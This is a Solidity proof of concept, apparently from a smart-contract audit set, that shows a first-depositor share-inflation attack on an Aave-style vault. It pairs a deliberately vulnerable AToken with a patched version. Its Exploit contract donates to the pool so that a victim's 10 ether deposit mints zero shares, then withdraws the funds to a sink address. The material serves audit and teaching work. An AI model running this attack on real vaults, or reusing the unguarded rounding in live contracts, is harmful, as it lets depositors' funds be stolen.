// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// AuditVault 51950 - Bonzo / Aave-style AToken first deposit.
// shares = amount * supply / pool rounds to 0 after the first depositor donates.
// The victim's 10 ether is pulled and credited to the attacker's 1 wei share.

contract ERC20Mini {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract AToken {
    ERC20Mini public underlying;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(ERC20Mini u) {
        underlying = u;
    }

    function deposit(uint256 amount) external returns (uint256 shares) {
        uint256 supply = totalSupply; // S:supply
        uint256 pool = underlying.balanceOf(address(this)); // @@readpool
        if (supply == 0) {
            shares = amount; // S:first
        } else {
            // @> VULN: rounds to 0 when pool has been donated above the victim's deposit
            shares = amount * supply / pool; // S:vuln
        }
        underlying.transferFrom(msg.sender, address(this), amount); // S:pull
        totalSupply = supply + shares; // S:sup
        balanceOf[msg.sender] += shares; // @@credit
    }

    function withdraw(uint256 sharesOut) external returns (uint256 amount) {
        uint256 pool = underlying.balanceOf(address(this)); // @@redeempool
        amount = sharesOut * pool / totalSupply; // S:wamt
        totalSupply -= sharesOut; // S:wsup
        balanceOf[msg.sender] -= sharesOut; // @@debit
        underlying.transfer(msg.sender, amount); // S:wsend
    }
}

contract ATokenFixed {
    ERC20Mini public underlying;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(ERC20Mini u) {
        underlying = u;
    }

    function deposit(uint256 amount) external returns (uint256 shares) {
        uint256 supply = totalSupply;
        uint256 pool = underlying.balanceOf(address(this));
        if (supply == 0) {
            shares = amount;
        } else {
            shares = amount * supply / pool;
        }
        require(shares != 0, "zero shares minted");
        underlying.transferFrom(msg.sender, address(this), amount);
        totalSupply = supply + shares;
        balanceOf[msg.sender] += shares;
    }

    function withdraw(uint256 sharesOut) external returns (uint256 amount) {
        uint256 pool = underlying.balanceOf(address(this));
        amount = sharesOut * pool / totalSupply;
        totalSupply -= sharesOut;
        balanceOf[msg.sender] -= sharesOut;
        underlying.transfer(msg.sender, amount);
    }
}

contract Depositor {
    function deposit(AToken vault, ERC20Mini token, uint256 amt) external {
        token.approve(address(vault), amt);
        vault.deposit(amt);
    }

    function depositFixed(ATokenFixed vault, ERC20Mini token, uint256 amt) external {
        token.approve(address(vault), amt);
        vault.deposit(amt);
    }
}

contract Exploit {
    uint256 public constant SEED = 1;
    uint256 public constant DONATION = 10 ether;
    uint256 public constant VICTIM = 10 ether;
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    ERC20Mini public token;
    AToken public vault;
    Depositor public victim;
    uint256 public victimShares;
    uint256 public profit;

    function run() external {
        token = new ERC20Mini("UNDERLYING");
        vault = new AToken(token);
        victim = new Depositor();

        token.mint(address(this), SEED + DONATION);
        token.approve(address(vault), SEED);
        vault.deposit(SEED);
        token.transfer(address(vault), DONATION);

        token.mint(address(victim), VICTIM);
        victim.deposit(vault, token, VICTIM);
        victimShares = vault.balanceOf(address(victim));
        require(victimShares == 0, "shares");
        require(token.balanceOf(address(this)) == 0, "flat");

        vault.withdraw(SEED);
        require(token.balanceOf(address(this)) == SEED + DONATION + VICTIM, "pool");
        profit = VICTIM;
        token.transfer(SINK, profit);
    }
}
